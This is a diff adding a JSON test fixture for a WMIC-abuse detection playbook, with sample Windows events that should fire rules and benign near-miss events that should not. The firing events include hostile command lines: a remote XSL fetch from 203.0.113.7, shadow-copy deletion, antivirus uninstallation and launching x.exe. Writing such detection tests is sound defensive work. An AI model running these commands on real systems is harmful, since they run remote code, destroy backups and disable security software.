@@ -1,0 +1,105 @@
+{
+ "playbook": "signal_wmic_abuse",
+ "fires": [
+  {
+   "rule": "WMIC Process Creation",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "CommandLine": "wmic process call create \"C:\\ProgramData\\x.exe\"",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "WMIC XSL Script Execution",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 1,
+      "windows.channel": "Microsoft-Windows-Sysmon/Operational",
+      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "CommandLine": "wmic os get /format:\"https://203.0.113.7/a.xsl\"",
+      "User": "CORP\\alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "WMIC Shadow Copy Delete",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "CommandLine": "wmic shadowcopy delete /nointeractive",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "WMIC Remote Execution",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "CommandLine": "wmic /node:FS01 os get caption",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "WMIC Product Uninstall",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "CommandLine": "wmic product where \"name like '%Antivirus%'\" call uninstall /nointeractive",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  }
+ ],
+ "near_miss": [
+  {
+   "name": "local inventory query",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "CommandLine": "wmic os get caption,version",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "name": "listing processes",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "CommandLine": "wmic process list brief",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  }
+ ]
+}
